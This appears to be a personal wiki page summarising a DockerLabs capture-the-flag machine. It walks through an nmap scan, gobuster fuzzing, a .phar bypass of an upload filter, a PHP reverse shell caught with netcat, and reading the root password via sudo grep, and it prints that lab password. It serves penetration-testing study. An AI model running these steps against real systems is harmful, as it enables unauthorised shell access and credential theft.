---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, gobuster, curl, netcat]
techniques: [information-gathering, directory-fuzzing, web-shell-upload, reverse-shells, sudo-abuse]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[file]]", "[[dance-samba]]"]
---

# Dockerlabs

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/dockerlabs.md)

> **Naming note:** the box is named after the platform. The machine page is `dockerlabs-box` so the wikilink `[[dockerlabs]]` keeps resolving to [[dockerlabs]] — same stem on both pages would make every link ambiguous (and the lint's set-based link check would *not* catch it).

Easy box: a `.zip`-only upload filter with a **refusal message as its own oracle**, the `.phar` bypass a second time, and a root password read straight off disk with sudo'd `grep`.

## Path

1. **Recon** — `ping -c 2` (`ttl=64`). `nmap -p- --open -sS --min-rate 5000` → only `80/tcp`, Apache 2.4.58, title **Dockerlabs** ([[information-gathering]]).
2. **Dir fuzz** — [[gobuster]] (DirBuster medium, `-x php,html,txt`) → `index.php` (200, 8235 B), `uploads/` (301), `upload.php` (200, **0 B**), `machine.php` (200, 1361 B), `server-status` (403) ([[directory-fuzzing]]).
3. **Upload surface** — `machine.php` renders a form posting multipart to `upload.php`. A probe upload answers with the filter announcing itself: *"No se permite la subida de archivos que no sean .zip"* ([[web-shell-upload]]).
4. **Extension fuzz — the refusal phrase is the oracle** — a hand-rolled bash loop over `web-extensions.txt` sends `revshell.$ext` per line and flags any response where **the exact refusal sentence is absent**. Exactly one extension passes: **`.phar`** → *"ha sido subido correctamente"* (200, 54 B). Same calibration as [[file]]'s `-fs 33`, phrased in words instead of bytes.
5. **Trigger** — `curl http://172.17.0.2/uploads/revshell.phar` (pentestmonkey PHP shell → `172.17.0.1:443`), caught with `sudo nc -lvnp 443` → **`www-data`** ([[reverse-shells]]).
6. **Privesc — sudo'd search tools as a root file read** — `/opt/nota.txt`: *"Protege la clave de root, se encuentra en su directorio `/root/clave.txt`, menos mal que nadie tiene permisos para acceder a ella."* → `sudo -l` → `(root) NOPASSWD: /usr/bin/cut` + `/usr/bin/grep` → `sudo -u root /usr/bin/grep '' /root/clave.txt` (empty pattern matches **every** line → prints the file) → **`dockerlabsmolamogollon123`** → `su -` → `whoami` = `root` ([[sudo-abuse]]).

## Credentials / secrets

| Item | Value | Where |
|------|-------|-------|
| root | `dockerlabsmolamogollon123` | `/root/clave.txt`, read via `sudo grep ''` |

## Takeaways

- **A refusal message is an oracle.** The filter told you its exact rule *and* its exact refusal sentence — fuzzing then only has to watch that sentence disappear. This is what `ffuf -fs` computes from content length, done by hand with `grep -q` ([[web-shell-upload]], [[file]]).
- **`.phar` is now a pattern, not a coincidence.** Two DockerLabs easy boxes in a row ended their extension fuzz at `phar`: ask what the server *runs*, not what the filter *allows* — PHP executes `.phar` by default even when `.php` is named in the rule.
- **Search tools are readers.** `grep '' file` prints everything; `cut -c1- file` is the untested twin left in the same `sudo -l` output. GTFOBins has a file-read section for exactly this ([[dance-samba]]'s `sudo file -f`).
- **Read every post-exploit file.** `/opt/nota.txt` didn't hold the password — it told you *where* the password was and (ironically) that nobody could read it ([[hardcoded-credentials]]).
- **Always fetch what fuzzing finds.** `index.php` came back at 8235 B and was never requested.

## Gaps in the writeup

- **Neither `/` nor `index.php` was ever fetched.** The landing page's content is unknown — the writeup jumps from gobuster straight to `machine.php`.
- **`cut` is granted but never used or explained.** It's an equivalent read primitive (`sudo -u root /usr/bin/cut -c1- /root/clave.txt`); worth confirming on a re-run which of the two the author intended.
- **The raw source has malformed code fences** (4–5 backticks around the `sudo -l` block) — cosmetic, but it will break naive fence-stripping tooling that assumes balanced ``` pairs.
- `server-status` (403) was noted and skipped — correct call, recorded for completeness.
